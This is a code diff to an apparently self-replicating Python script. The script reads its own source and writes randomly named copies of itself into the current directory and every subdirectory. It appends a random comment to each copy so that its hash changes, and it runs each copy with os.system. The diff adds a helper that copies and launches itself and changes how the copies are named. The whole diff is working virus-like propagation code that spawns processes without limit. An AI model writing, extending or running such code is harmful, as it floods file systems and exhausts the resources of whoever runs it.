@@ -26,24 +26,37 @@ def writeIntoFile(file, lines):
             break
         file.write(line)
 
+
+def runFunc(dir, filename, lines):
+    os.chdir(dir)
+    print(dir)
+    g = open(".\\" + filename, "w")
+    writeIntoFile(g, lines)
+    g.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
+    g.close()
+    os.system('python3 .\\' + filename)
+
 def runFuncv(filename):
     os.system('python3 ' + filename)
 
 # get the current file
 thisfile = os.path.basename(__file__)
+
 directory = os.getcwd()
+
+print(thisfile)
 
 # open up the file and read it
 f = open(thisfile, "r")
 lines = f.readlines()
 f.close()
 
-
-
-
 # Create the new file and include a different name
-filename = "{randomness}.py".format(
+filename = "newpython{randomness}.py".format(
     randomness="".join(random.choices(string.ascii_lowercase + string.digits, k=5)))
+
+
+
 i = open(".\\" + filename, "w")
 writeIntoFile(i, lines)
 i.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
@@ -55,8 +68,6 @@ thread.start()
 for x in os.walk(directory):
     if x[0] == os.getcwd():
         continue
-    # Create the new file and include a different name
-    filename = "{randomness}.py".format(randomness="".join(random.choices(string.ascii_lowercase + string.digits, k=5)))
     g = open(x[0] + "\\" + filename, "w")
     writeIntoFile(g, lines)
     g.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
@@ -79,19 +90,7 @@ for x in os.walk(directory):
 
 # except:
 #    pass
-def previousFolder(file, lines):
-    count = len(lines)
-    start = 0
-    for line in lines:
-        start = start + 1
-        # we dont want to copy the random string added to the end
-        if start == (count - 1):
-            break
-        file.write(line)
-        if start == 14:
-            if not ("os.chdir('../')" in lines):
-                print("this is where it is")
-                file.write("\nos.chdir('../')\n")
+
 
 # Ensure this thread gets closed
 sys.exit()
